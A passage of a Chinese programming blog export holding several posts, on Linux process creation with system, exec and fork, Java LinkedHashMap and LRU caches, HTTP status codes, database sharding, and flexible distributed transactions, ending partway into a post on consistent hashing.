ps进程结束后才返回，才能继续执行下面的代码 system(\"ps au\");// 1 printf(\"ps Done\\n\"); exit(0);&#125; 一般来说，使用system()函数不是启动其他进程的理想手段，因为它必须用一个shell来启动需要的程序，即在启动程序之前需要先启动一个shell，而且对shell的环境的依赖也很大，因此使用system()函数的效率不高。 替换进程映像——使用exec系列函数exec系列函数由一组相关的函数组成，它们在进程的启动方式和程序参数的表达方式上各有不同。 但是，exec系列函数都有一个共同的工作方式，就是把当前进程替换为一个新进程，也就是说你可以使用exec函数将程序的执行从一个程序切换到另一个程序。 在新的程序启动后，原来的程序就不再执行了，新进程由path或file参数指定。exec函数比system函数更有效。 exec系列函数的类型为： 1234567891011#include &lt;unistd.h&gt;char **environ;int execl (const char *path, const char *arg0, ..., (char*)0);int execlp(const char *file, const char *arg0, ..., (char*)0);int execle(const char *path, const char *arg0, ..., (char*)0, char *const envp[]);int execv (const char *path, char *const argv[]);int execvp(cosnt char *file, char *const argv[]);int execve(const char *path, char *const argv[], char *const envp[]); 这类函数可以分为两大类，execl、execlp和execle的参数是可变的，以一个空指针结束，而execv、execvp和execve的第二个参数是一个字符串数组，在调用新进程时，argv作为新进程的main函数的参数。而envp可作为新进程的环境变量,传递给新的进程，从而变量它可用的环境变量。 这类函数可以分为两大类，execl、execlp和execle的参数是可变的，以一个空指针结束，而execv、execvp和execve的第二个参数是一个字符串数组，在调用新进程时，argv作为新进程的main函数的参数。而envp可作为新进程的环境变量,传递给新的进程，从而变量它可用的环境变量。 承接上一个例子，如果想用exec系统函数来启动ps进程，则这6个不同的函数的调用语句为： 注：arg0为程序的名字，所以在这个例子中全为ps。 12345678910char *const ps_envp[] = &#123;\"PATH=/bin:usr/bin\", \"TERM=console\", 0&#125;;char *const ps_argv[] = &#123;\"ps\", \"au\", 0&#125;; execl(\"/bin/ps\", \"ps\", \"au\", 0);execlp(\"ps\", \"ps\", \"au\", 0);execle(\"/bin/ps\", \"ps\", \"au\", 0, ps_envp); execv(\"/bin/ps\", ps_argv);execvp(\"ps\", ps_argv);execve(\"/bin/ps\", ps_argv, ps_envp); 下面我给出一个完整的例子，源文件名为new_ps_exec.c，代码如下： 1234567891011#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; int main()&#123; printf(\"Running ps with execlp\\n\"); execlp(\"ps\", \"ps\", \"au\", (char*)0); printf(\"ps Done\"); exit(0);&#125; 注意，一般情况下，exec函数是不会返回的，除非发生错误返回-1，由exec启动的新进程继承了原进程的许多特性，在原进程中已打开的文件描述符在新进程中仍将保持打开，但任何在原进程中已打开的目录流都将在新进程中被关闭。 复制进程映像——fork函数fork()函数的应用exec()调用用新的进程替换当前执行的进程，而我们也可以用fork()来复制一个新的进程，新的进程几乎与原进程一模一样，执行的代码也完全相同，但新进程有自己的数据空间、环境和文件描述符。 fork()函数的原型为： 1234#include &lt;sys/type.h&gt;#include &lt;unistd.h&gt;pid_t fork(); 注：在父进程中，fork()返回的是新的子进程的PID，子进程中的fork()返回的是0，我们可以通过这一点来判断父进程和子进程，如果fork()调用失败，它返回-1. 继承上面的例子，下面我给出一个调用ps的例子，源文件名为new_ps_fork.c，代码如下： 1`#include &lt;unistd.h&gt;``#include &lt;sys/types.h&gt;``#include &lt;stdio.h&gt;``#include &lt;stdlib.h&gt;` `int` `main()``&#123;`` ``pid_t pid = fork();`` ``switch``(pid)`` ``&#123;`` ``case` `-1:`` ``perror``(``\"fork failed\"``);`` ``exit``(1);`` ``break``;`` ``case` `0:`` ``// 这是在子进程中，调用execlp切换为ps进程`` ``printf``(``\"\\n\"``);`` ``execlp(``\"ps\"``, ``\"ps\"``, ``\"au\"``, 0);`` ``break``;`` ``default``:`` ``// 这是在父进程中，输出相关提示信息`` ``printf``(``\"Parent, ps Done\\n\"``);`` ``break``;`` ``&#125;`` ``exit``(0);``&#125;` 等待一个进程wait()函数和waitpid()函数的原型为： 12345#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;pid_t wait(int *stat_loc);pid_t waitpid(pid_t pid, int *stat_loc, int options); wait()用于在父进程中调用，让父进程暂停执行等待子进程的结束，返回子进程的PID，如果stat_loc不是空指针，状态信息将被写入stat_loc指向的位置。 waitpid()等待进程id为pid的子进程的结束（pid为-1，将返回任一子进程的信息），stat_loc参数的作用与wait函数相同，options用于改变waitpid的行为，其中有一个很重要的选项WNOHANG，它的作用是防止waippid调用者的执行挂起。如果子进程没有结束或意外终止，它返回0，否则返回子进程的pid。 总结首先是最简单的system()函数，它需要启动新的shell并在新的shell是执行子进程，所以对环境的依赖较大，而且效率也不高。同时system()函数要等待子进程的返回才能执行下面的语句。 exec系统函数是用新的进程来替换原先的进程，效率较高，但是它不会返回到原先的进程，也就是说在exec函数后面的所以代码都不会被执行，除非exec调用失败。然而exec启动的新进程继承了原进程的许多特性，在原进程中已打开的文件描述符在新进程中仍将保持打开，但需要注意，任何在原进程中已打开的目录流都将在新进程中被关闭。 fork()则是用当前的进程来复制出一个新的进程，新进程与原进程一模一样，执行的代码也完全相同，但新进程有自己的数据空间、环境变量和文件描述符，我们通常根据fork()函数的返回值来确定当前的进程是子进程还是父进程，即它并不像exec那样并不返回，而是返回一个pid_t的值用于判断，我们还可以继续执行fork()后面的代码。感觉用fork()与exec系列函数就能创建很多需的进程。 Reference Linux启动新进程的几种方法及比较 - https://blog.csdn.net/ljianhui/article/details/10089345","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"},{"name":"Linux","slug":"OperatingSystem/Linux","permalink":"http://swsmile.info/categories/OperatingSystem/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"},{"name":"Operating Systems","slug":"Operating-Systems","permalink":"http://swsmile.info/tags/Operating-Systems/"}]},{"title":"【Java】集合类 - LinkedHashMap","date":"2019-07-16T02:09:05.000Z","path":"2019/07/16/【Java】集合类-LinkedHashMap/","text":"LinkedHashMapHashMap是无序的，也就是说，迭代HashMap所得到的元素顺序并不是它们最初放置到HashMap的顺序。HashMap的这一缺点往往会造成诸多不便，因为在有些场景中，我们的确需要用到一个可以保持插入顺序的Map。 庆幸的是，JDK为我们解决了这个问题，它为HashMap提供了一个子类 —— LinkedHashMap。 由于LinkedHashMap是HashMap的子类，所以LinkedHashMap自然会拥有HashMap的所有特性。比如，LinkedHashMap的元素存取过程基本与HashMap基本类似，只是在细节实现上稍有不同。当然，这是由LinkedHashMap本身的特性所决定的，因为它额外维护了一个双向链表用于保持迭代顺序。 虽然LinkedHashMap增加了时间和空间上的开销，但是它通过维护一个额外的双向链表保证了迭代顺序。 特别地，该迭代顺序可以是插入顺序，也可以是访问顺序。因此，根据链表中元素的顺序可以将LinkedHashMap分为：保持插入顺序的LinkedHashMap 和 保持访问顺序的LinkedHashMap，其中LinkedHashMap的默认实现是按插入顺序排序的。 总结来说，HashMap和双向链表合二为一即是LinkedHashMap。所谓LinkedHashMap，其落脚点在HashMap，因此更准确地说，它是一个将所有Entry节点链入一个双向链表的HashMap。 实验LinkedHashMap有一个参数 accessOrder 决定是否在插入顺序的基础上，再根据访问顺序排序： 123456789101112131415161718192021222324252627282930public static void main(String[] args) &#123; Map&lt;String, String&gt; map = new LinkedHashMap&lt;String, String&gt;(); map.put(\"apple\", \"苹果\"); map.put(\"watermelon\", \"西瓜\"); map.put(\"banana\", \"香蕉\"); map.put(\"peach\", \"桃子\"); Iterator iter = map.entrySet().iterator(); while (iter.hasNext()) &#123; Map.Entry entry = (Map.Entry) iter.next(); System.out.println(entry.getKey() + \"=\" + entry.getValue()); &#125; System.out.println(); /////////////////////////////////////////////////// map = new LinkedHashMap&lt;String, String&gt;(16,0.75f,true); map.put(\"apple\", \"苹果\"); map.put(\"watermelon\", \"西瓜\"); map.put(\"banana\", \"香蕉\"); map.put(\"peach\", \"桃子\"); map.get(\"banana\"); map.get(\"apple\"); Iterator iter = map.entrySet().iterator(); while (iter.hasNext()) &#123; Map.Entry entry = (Map.Entry) iter.next(); System.out.println(entry.getKey() + \"=\" + entry.getValue()); &#125;&#125; 输出： 123456789apple=苹果watermelon=西瓜banana=香蕉peach=桃子watermelon=西瓜peach=桃子banana=香蕉apple=苹果 底层实现在LinkedHashMapMap中，所有put进来的Entry都保存在一个哈希表中，但由于它又额外定义了一个以head为头结点的双向链表，因此对于每次put进来Entry，除了将其保存到哈希表中对应的位置上之外，还会将其插入到双向链表的尾部。 三个重点实现的函数在HashMap中提到了下面的定义： 1234// Callbacks to allow LinkedHashMap post-actionsvoid afterNodeAccess(Node&lt;K,V&gt; p) &#123; &#125;void afterNodeInsertion(boolean evict) &#123; &#125;void afterNodeRemoval(Node&lt;K,V&gt; p) &#123; &#125; LinkedHashMap继承于HashMap，因此也重新实现了这3个函数，顾名思义这三个函数的作用分别是：节点访问后、节点插入后、节点移除后做一些事情。 afterNodeAccess函数12345678910111213141516171819202122232425void afterNodeAccess(Node&lt;K,V&gt; e) &#123; // move node to last LinkedHashMap.Entry&lt;K,V&gt; last; // 如果定义了accessOrder，那么就保证最近访问节点放到最后 if (accessOrder &amp;&amp; (last = tail) != e) &#123; LinkedHashMap.Entry&lt;K,V&gt; p = (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after; p.after = null; if (b == null) head = a; else b.after = a; if (a != null) a.before = b; else last = b; if (last == null) head = p; else &#123; p.before = last; last.after = p; &#125; tail = p; ++modCount; &#125;&#125; 就是说在进行put之后就算是对节点的访问了，那么这个时候就会更新链表，把最近访问的放到最后，保证链表。 afterNodeInsertion函数12345678void afterNodeInsertion(boolean evict) &#123; // possibly remove eldest LinkedHashMap.Entry&lt;K,V&gt; first; // 如果定义了移除规则，则执行相应的溢出 if (evict &amp;&amp; (first = head) != null &amp;&amp; removeEldestEntry(first)) &#123; K key = first.key; removeNode(hash(key), key, null, false, true); &#125;&#125; 如果用户定义了removeEldestEntry的规则，那么便可以执行相应的移除操作。 afterNodeRemoval函数1234567891011121314void afterNodeRemoval(Node&lt;K,V&gt; e) &#123; // unlink // 从链表中移除节点 LinkedHashMap.Entry&lt;K,V&gt; p = (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after; p.before = p.after = null; if (b == null) head = a; else b.after = a; if (a == null) tail = b; else a.before = b;&#125; 这个函数是在移除节点后调用的，就是将节点从双向链表中删除。 我们从上面3个函数看出来，基本上都是为了保证双向链表中的节点次序或者双向链表容量所做的一些额外的事情，目的就是保持双向链表中节点的顺序要从eldest到youngest。 put和get函数put函数在LinkedHashMap中未重新实现，只是实现了afterNodeAccess和afterNodeInsertion两个回调函数。get函数则重新实现并加入了afterNodeAccess来保证访问顺序，下面是get函数的具体实现： 12345678public V get(Object key) &#123; Node&lt;K,V&gt; e; if ((e = getNode(hash(key), key)) == null) return null; if (accessOrder) afterNodeAccess(e); return e.value;&#125; Reference Map 综述（二）：彻头彻尾理解 LinkedHashMap - https://blog.csdn.net/justloveyou_/article/details/71713781 Java集合系列之LinkedHashMap - https://juejin.im/post/5a4b433b6fb9a0451705916f Java LinkedHashMap工作原理及实现 - https://yikun.github.io/2015/04/02/Java-LinkedHashMap工作原理及实现/","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Operating System】LRU（Least Recently Used）算法","date":"2019-07-15T14:23:41.000Z","path":"2019/07/15/【Operating-System】LRU算法/","text":"LRU 的来源LRU（Least Recently Used），近期最少使用算法， 常应用于缓存中的数据淘汰， 其核心思想是“如果数据最近被访问过，那么将来被访问的几率也更高“。 基于数组实现仔细看下这个算法的定义： 近期最少使用算法，其实就是按照”近期最少使用”这个条件去淘汰相应的数据。 既然是淘汰最近最少使用的数据，姑且就可以理解为，当内存满了的那个时刻，内存中，哪些数据最后一次被访问的时间最小， 不表示哪些数据是冷数据，应该被移除。 假如每条数据有一个属性lasttime，用来记录被访问时刻的时间，这样，每一条数据都有一个最后访问时间， 当内存满的时候，遍历所有元素，删除最后访问时间最小的那个元素： 1234567lasttime = current_time()lastKey = null;if list full: foreach each item of list: if item.lasttime &lt; lasttime: lasttime = item.lasttime lastKey = item.key 然后把lastKey指向的那条数据删除。 性能分析这个算法是可行的。但是，当内存满时，删除最近最长时间未被使用元素的平均时间复杂度为 O(n)，因为，我们需要先找到 lasttime 为最小的数据元素，将其删除，再将这个数据元素之后的元素向前移动一格。 试想一下，假如有一千万条数据，每次删除都需要找出访问时间最早的那些数据，这是很耗资源的操作， 时间复杂度是O(N)，跟数据量成正比，数据量越大，性能越低。 不仅如此，查找一个数据元素的时间复杂度也是O(N)。 基于双向链表的实现基于以上不足，我们可以通过使用链表来实现，这样，当缓存中数据元素的个数，超过阈值时，“删除最近最久未使用元素”操作的时间复杂度仅为 O(1)： 每次写入数据时，将数据放入链表头结点，时间复杂度为 O(1)。 使用缓存中数据时，将数据移动到头结点，时间复杂度为 O(n)。 缓存数量超过阈值时，移除链表尾部数据，时间复杂度为 O(1)。 这个算法同样是可行的。但是，问题在于“使用缓存中数据时，将数据移动到头结点”操作的时间复杂度为 O(n)。 基于链表 + Hashmap 的实现“使用缓存中数据时，将数据移动到头结点”操作的时间复杂度为 O(n)的问题在于我们无法在链表中直接定位到该数据元素，因此不得不进行对链表的遍历。 通过引入Hashmap，就能实现定位特定元素的时间复杂度为 O(1)。 在 Java 中，LinkedHashMap是一个封装了链表 + Hashmap的类。通过简单对LinkedHashMap进行封装，就实现了一个LRUCache： 12345678910111213141516import java.util.LinkedHashMap;import java.util.Map;/** * 简单用LinkedHashMap来实现的LRU算法的缓存 */public class LRUCache&lt;K, V&gt; extends LinkedHashMap&lt;K, V&gt; &#123; private int cacheSize; public LRUCache(int cacheSize) &#123; super(16, (float) 0.75, true); this.cacheSize = cacheSize; &#125; @Override protected boolean removeEldestEntry(Map.Entry&lt;K, V&gt; eldest) &#123; return size() &gt; cacheSize; &#125;&#125; Reference LRU算法的原理和实现 - http://dongyado.com/algorithm/funny/2016/04/23/implement-lru-cache-by-yourself/ LRU算法四种实现方式介绍 - https://blog.csdn.net/elricboa/article/details/78847305 看动画理解「链表」实现LRU缓存淘汰算法 - https://cxyxiaowu.com/articles/2019/04/04/1554345296887.html","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"},{"name":"Algorithm","slug":"OperatingSystem/Algorithm","permalink":"http://swsmile.info/categories/OperatingSystem/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"},{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Network】HTTP 常用响应码","date":"2019-07-15T08:06:44.000Z","path":"2019/07/15/【HTTP】HTTP常用响应码/","text":"2XX - 成功请求正常处理完毕 200 OK： 从客户端发送的请求在服务端被正常处理了。 201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。 204 No Content： 服务器接受的请求已成功处理，但返回的响应报文的主体部分不包含实体（浏览器页面不更新，仅发送信息给服务器） 206 Partial Content： 客户端进行了范围请求，而服务器成功执行了这部分请求 3XX - 重定向浏览器需要执行某些特殊的处理以正确处理请求。 301 Moved Permanently 永久性重定向，请求的资源已经分配了新的URI，以后应该使用资源现在所指的URI 302 Found 临时性重定向，请求的资源临时分配了新的URI，希望用户本次可以使用新的URI访问（比如，未登陆时，302 重定向到登录页面） 304 Not Modified 服务器端资源未改变，可直接使用客户端未过期的缓存，不包含任何响应的主体部分 4XX - 客户端错误客户端是发生错误的原因所在。 400 Bad Request 请求报文中存在语法错误 401 Unauthorized 请求需要有通过HTTP认证的认证信息。另外如果之前已进行一次请求，则表示用户认证失败 403 Forbidden 对请求资源的访问被服务器拒绝了，如未获得文件系统的访问授权，访问权限出现某些问题 404 Not Found 服务器上没有请求的资源 499 client has closed connection 服务器端处理的时间过长，客户端主动断开链接，ngix定义的状态码 5XX - 服务器错误服务器是发生错误的原因所在。 500 Internal Server Error 服务器在执行请求时发生了错误，Bug或临时故障 503 Service Unavailable 服务器暂时处于超负荷或正在进行停机维护，现在无法处理请求","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"},{"name":"HTTP","slug":"Network/HTTP","permalink":"http://swsmile.info/categories/Network/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/tags/HTTP/"},{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Database】分库分表","date":"2019-07-12T14:53:44.000Z","path":"2019/07/12/【Database】分库分表/","text":"水平分库分表水平分库当数据库中单表的数据量很大时，采用水平分区的方式对数据进行拆分（将同一个表中不同的数据拆分到不同数据库中）。比如，以对某个主键进行hash取模的方式（以保证对N个数据库的访问负载是均衡的），将数据分布表到N个数据库中。 值得一提的是，进行分库分表后，进行对跨库的表join、事务操作或者数据统计、排序时，又出现了新的性能问题。 使用原因大部分互联网业务数据量很大，单库容量容易成为瓶颈，如果希望： 线性降低单库数据容量 线性提升数据库写性能 此时可以使用水平切分架构。 一句话总结，水平切分主要解决“数据库数据量大”问题，在数据库容量扛不住的时候，通常水平切分。 水平分表水平分表也称为横向分表，比较容易理解，就是将表中不同的数据行按照一定规律分布到不同的数据库表中（这些表保存在同一个数据库中），这样来降低单表数据量，优化查询性能。最常见的方式就是通过主键或者时间等字段进行 Hash 和取模后拆分。 切分策略1 查询切分将ID和库的Mapping关系记录在一个单独的库中。 优点：ID和库的Mapping算法可以随意更改。缺点：引入额外的单点。 2 范围切分比如按照时间区间或ID区间来切分。 优点：单表大小可控，天然水平扩展。缺点：无法解决集中写入瓶颈的问题。 3 Hash切分一般采用Mod来切分，下面着重讲一下Mod的策略。 数据水平切分后我们希望是一劳永逸或者是易于水平扩展的，所以推荐采用$mod 2^n$这种一致性Hash。 以统一订单库为例，我们分库分表的方案是32*32的，即通过UserId后四位mod 32分到32个库中，同时再将UserId后四位Div 32 Mod 32将每个库分为32个表，共计分为1024张表。线上部署情况为8个集群(主从)，每个集群4个库。 垂直分表分库垂直分表 典型的应用场景是在文章列表这样的场景，一般来讲，我们的文章表会有title、userId、Content等字段，其中的Content字段一般是Text或者LongText类型，而其它的字段都是固定长度的数据类型。我们知道一个数据库优化规则是： 如果一个表的所有字段都是固定长度类型的，那么它就是定长表，定长表比动态长度表查询性能要高 那么，我们就可以使用垂直分表来将文章表分成文章表和文章内容表。于是文章列表页面所需的查询，就只需要查询一张定长表了。 或者，某个表中的字段比较多，可以新建立一张“扩展表”，将不经常使用或者长度较大的字段拆分出去放到“扩展表”中。 垂直分库垂直分库针对的是一个系统中的不同业务进行拆分，比如用户User一个库，商品Producet一个库，订单Order一个库。 切分后，要放在多个服务器上，而不是一个服务器上。为什么？ 我们想象一下，一个购物网站对外提供服务，会有用户，商品，订单等的CRUD。没拆分之前， 全部都是落到单一的库上的，这会让数据库的单库处理能力成为瓶颈。按垂直分库后，如果还是放在一个数据库服务器上， 随着用户量增大，这会让单个数据库的处理能力成为瓶颈，还有单个服务器的磁盘空间，内存，tps等非常吃紧。 所以我们要拆分到多个服务器上，这样上面的问题都解决了，以后也不会面对单机资源问题。 数据库业务层面的拆分，和服务的“治理”，“降级”机制类似，也能对不同业务的数据分别的进行管理，维护，监控，扩展等。 数据库往往最容易成为应用系统的瓶颈，而数据库本身属于“有状态”的，相对于Web和应用服务器来讲，是比较难实现“横向扩展”的。 数据库的连接资源比较宝贵且单机处理能力也有限，在高并发场景下，垂直分库一定程度上能够突破IO、连接数及单机硬件资源的瓶颈。 分库分表中间件 cobar TDDL atlas sharding-jdbc mycat Reference 数据库读写分离架构，为什么我不喜欢 - http://www.10tiao.com/html/249/201801/2651960806/1.html MySQL读写分离最佳实践 - https://www.jianshu.com/p/1ac435a6510e 分库分表的几种常见形式以及可能遇到的难 - https://www.infoq.cn/article/key-steps-and-likely-problems-of-split-table 大众点评订单系统分库分表实践 - https://tech.meituan.com/2016/11/18/dianping-order-db-sharding.html MySQL 分库分表方案，总结的非常好！ - https://juejin.im/entry/5b5eb7f2e51d4519700f7d3c 表的垂直拆分和水平拆分 - https://www.kancloud.cn/thinkphp/mysql-design-optimalize/39326 基于MySQL数据库下亿级数据的分库分表 - https://zhuanlan.zhihu.com/p/54594681?utm_source=wechat_session&amp;utm_medium=social&amp;utm_oi=559493336751333376&amp;from=singlemessage&amp;isappinstalled=0","comments":true,"categories":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/tags/Database/"}]},{"title":"【Distributed System】柔性事务（Flexible Transactions）","date":"2019-07-12T14:03:17.000Z","path":"2019/07/12/【Distributed-System】柔性事务/","text":"背景分布式事务 是所有分布式数据库产品都需要解决的核心问题。这一问题的关键是 —— 数据存储在多个节点，原本在单机数据库上不难实现的 ACID 特性在分布式环境下变得困难： 因为网络通信的不可靠，事务的原子性需要用多次日志和网络通信来保证。 存储节点的增加，放大了单个存储节点在事务过程中出现故障的风险。 用锁实现的事务隔离性，在故障或网络抖动时严重影响性能。 因此，在高可用与高性能的应用场景，分布式事务的最佳实践是放弃 ACID，遵循 BASE 的原则重构业务流程： 区别于 ACID 特性的数据库事务（满足ACID的事务称为钢性事务），这种放弃强一致性，采取最终一致的方式来执行的分布式事务称为柔性事务（Flexible Transactions）。 重试与幂等在分布式事务中，我们都无法避免一个问题，那就是接口调用或者说操作的失败，分布式情况下系统的状态往往不如单机条件下确定，所以可能经常需要重试，而不是一失败就回滚。 因此我们必须尽可能的避免重试对系统稳定性和性能的影响，于是有了幂等这个概念： 数学定义：f(x) = f(f(x))的性质 编程定义：对同一个系统，使用同样的条件，一次请求和重复的多次请求对系统资源的影响是一致的 柔性事务 （Flexible Transactions）柔性事务是由于互联网应用的需求产生的，而互联网应用最核心需求是高可用（即BASE中的BA）。 柔性事务（Flexible Transactions），是相对于传统数据库事务中计划于ACID的刚性事务来说。 柔性事务保证的是“基本可用，最终一致。”这其实就是基于BASE理论，保证数据的最终一致性。 柔性事务是在互联网的各种应用场景下产生的，因为，互联网最核心的需求是高可用。比如每年的京东618大促，交易高峰期间如果有10S不可用，那么损失的订单量大家可想而知。 柔性事务的实现消息事务补偿型 - TCC 事务（Try / Confirm / Cancel）事务补偿型的一个典型代表，就是TCC型事务（Try/Confirm/Cancel）。 TCC方案是可能是目前最火的一种柔性事务方案了。关于TCC（Try-Confirm-Cancel）的概念，最早是由Pat Helland于2007年发表的一篇名为《Life beyond Distributed Transactions:an Apostate’s Opinion》的论文提出。在该论文中，TCC还是以Tentative-Confirmation-Cancellation命名。正式以Try-Confirm-Cancel作为名称的是Atomikos公司，其注册了TCC商标。 国内最早关于TCC的报道，应该是InfoQ上对阿里程立博士的一篇采访。经过程博士的这一次传道之后，TCC在国内逐渐被大家广为了解并接受。 Atomikos公司在商业版本事务管理器ExtremeTransactions中提供了TCC方案的实现，但是由于其是收费的，因此相应的很多的开源实现方案也就涌现出来，如：tcc-transaction、ByteTCC、spring-cloud-rest-tcc。 TCC的作用主要是解决跨服务调用场景下的分布式事务问题， TCC 即 Try-Confirm-Cancel。 Try: 尝试执行业务 完成所有业务检查(一致性) 预留必须业务资源(准隔离性) Confirm:确认执行业务 真正执行业务 不作任何业务检查 只使用Try阶段预留的业务资源 Confirm操作要满足幂等性 Cancel: 取消执行业务 释放Try阶段预留的业务资源 Cancel操作要满足幂等性 这种类型和可补偿操作类似，就是提供一种提交和回滚的机制。是一种典型的两阶段类型的操作。这里说的两阶段类型操作并不是指2PC，他和2PC还是有区别的。 场景案例有一次，笔者买彩票中奖了(纯属虚构)，准备从合肥出发，到云南大理去游玩，然后使用美团App(机票代理商)来订机票。发现没有从合肥直达大理的航班，需要到昆明进行中转。如下图： 从图中我们可以看出来，从合肥到昆明乘坐的是四川航空，从昆明到大理乘坐的是东方航空。 由于使用的是美团App预定，当我选择了这种航班预定方案后，美团App要去四川航空和东方航空各帮我购买一张票。如下图： 考虑最简单的情况：美团先去川航帮我买票，如果买不到，那么东航也没必要买了。如果川航购买成功，再去东航购买另一张票。 现在问题来了：假设美团先从川航成功买到了票，然后去东航买票的时候，因为天气问题，东航航班被取消了。那么此时，美团必须取消川航的票，因为只有一张票是没用的，不取消就是浪费我的钱。那么如果取消会怎样呢？如果读者有取消机票经历的话，非正常退票，肯定要扣手续费的。在这里，川航本来已经购买成功，现在因为东航的原因要退川航的票，川航应该是要扣代理商的钱的。 那么美团就要保证，如果任一航班购买失败，都不能扣钱，怎么做呢？ 两个航空公司都为美团提供以下3个接口：机票预留接口、确认接口、取消接口。美团App分2个阶段进行调用，如下所示： 在第1阶段： 美团分别请求两个航空公司预留机票，两个航空公司分别告诉美图预留成功还是失败。航空公司需要保证，机票预留成功的话，之后一定能购买到。 在第2阶段： 如果两个航空公司都预留成功，则分别向两个公司发送确认购买请求。 如果两个航空公司任意一个预留失败，则对于预留成功的航空公司也要取消预留。这种情况下，对于之前预留成功机票的航班取消，也不会扣用户的钱，因为购买并没实际发生，之前只是请求预留机票而已。 通过这种方案，可以保证两个航空公司购买机票的一致性，要不都成功，要不都失败，即使失败也不会扣用户的钱。如果在两个航班都已经已经确认购买后，再退票，那肯定还是要扣钱的。 当然，实际情况肯定这里提到的肯定要复杂，通常航空公司在第一阶段，对于预留的机票，会要求在指定的时间必须确认购买(支付成功)，如果没有及时确认购买，会自动取消。假设川航要求10分钟内支付成功，东航要求30分钟内支付成功。以较短的时间算，如果用户在10分钟内支付成功的话，那么美团会向两个航空公司都发送确认购买的请求，如果超过10分钟(以较短的时间为准)，那么就不能进行支付。 总结在阿里巴巴，“柔性事务” 已经是重构分布式事务的标准方法，覆盖了商品、交易、支付各个大规模应用场景，并且经受了双十一的考验。阿里内部最常用的柔性事务方案有 “消息事务” 与 “TCC 事务” (Try / Confirm / Cancel)，它们的基本原理是一致的： 将业务中的分布式事务分解成一个个在独立分库上执行的子事务。 用异步重试的方式执行这些子事务，由框架或应用保证重试的 “幂等”（相同的业务逻辑不会被重复执行）。 如果需要回滚，以同样方式执行另一组子事务组成的补偿操作，恢复事务前的业务状态。 异步确保型将一些同步阻塞的事务操作变为异步的操作，避免对数据库事务的争用，典型例子是热点账户异步记账、批量记账的处理。 最大努力型（Best-effort delivery）最大努力型（Best-effort delivery）是最简单的一种柔性事务，适用于一些最终一致性时间敏感度低的业务，且被动方处理结果 不影响主动方的处理结果。典型的使用场景：如银行通知、商户通知等。最大努力通知型的实现方案，一般符合以下特点： 不可靠消息：业务活动主动方，在完成业务处理之后，向业务活动的被动方发送消息，直到通知N次后不再通知，允许消息丢失(不可靠消息)。 定期校对：业务活动的被动方，根据定时策略，向业务活动主动方查询(主动方提供查询接口)，恢复丢失的业务消息。 举例来说：笔者曾经做过一个短信发送平台，背景是公司内部有多个业务都有发送短信的需求，如果每个业务独立实现短信发送功能，存在功能实现上的重复。因此专门做了一个短信平台项目，所有的业务方都接入这个短信平台，来实现发送短信的功能。简化后的架构如下所示： 短信发送流程如下： 业务方将短信发送请求提交给短信平台 短信平台接收到要发送的短信，记录到数据库中，并标记其状态为”已接收” 短信平台调用外部短信发送供应商的接口，发送短信。外部供应商的接口也是异步将短信发送到用户手机上，因此这个接口调用后，立即返回，进入第4步。 更新短信发送状态为”已发送” 短信发送供应商异步通知短信平台短信发送结果。而通知可能失败，因此最多只会通知N次。 短信平台接收到短信发送结果后，更新短信发送状态，可能是成功，也可能失败(如手机欠费)。到底是成功还是失败并不重要，重要的是我们知道了这调短信发送的最终结果 如果最多只通知N次，如果都失败了的话，那么短信平台将不知道短信到底有没有成功发送。因此短信发送供应商需要提供一个查询接口，以方便短信平台驱动的去查询，进行定期校对。 在这个案例中，短信发送供应商通知短信平台短信发送结果的过程中，就是最典型的最大努力通知型方案，通知了N次就不再通知。通过提供一个短信结果查询接口，让短信平台可以进行定期的校对。而由于短信发送业务的时间敏感度并不高，比较适合采用这个方案。 Reference DRDS 柔性事务漫谈 - https://yq.aliyun.com/articles/599260 5.0 柔性事务：最大努力通知 - http://www.tianshouzhi.com/api/tutorials/distributed_transaction/387 7.0 柔性事务：可靠消息最终一致性 - http://www.tianshouzhi.com/api/tutorials/distributed_transaction/389 6.0 柔性事务 ：TCC两阶段补偿型 - http://www.tianshouzhi.com/api/tutorials/distributed_transaction/388 Java中的事务——全局事务与本地事务 - https://www.hollischuang.com/archives/1678","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Distributed System】一致性哈希（Consistent Hashing）","date":"2019-07-12T13:04:02.000Z","path":"2019/07/12/【Distributed-System】一致性哈希/","text":"问题在了解一致性哈希算法之前，最好先了解一下缓存中的一个应用场景，了解了这个应用场景之后，再来理解一致性哈希算法，就容易多了，也更能体现出一致性哈希算法的优点。 场景描述假设，我们有三台缓存服务器，用于缓存图片，我们为这三台缓存服务器编号为0号、1号、2号，现在，有3万张图片需要缓存，我们希望这些图片被均匀的缓存到这3台服务器上，以便它们能够分摊缓存的压力。 也就是说，我们希望每台服务器能够缓存1万张左右的图片，那么，我们应该怎样做呢？如果我们没有任何规律的将3万张图片平均的缓存在3台服务器上，可以满足我们的要求吗？ 